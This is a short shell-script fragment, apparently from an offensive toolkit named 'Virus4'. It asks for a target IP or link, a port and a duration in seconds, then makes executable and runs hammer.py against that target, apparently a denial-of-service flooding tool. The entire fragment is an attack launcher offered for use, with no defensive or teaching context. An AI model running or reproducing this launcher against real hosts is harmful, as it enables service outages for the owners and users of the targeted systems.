read -p "                   ip/link------>" ip
read -p "                      port/80---->" pr
read -p "                         Time in seconds---->" ti
clear
echo -e "$green"
cd
cd Virus4
cd .hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti
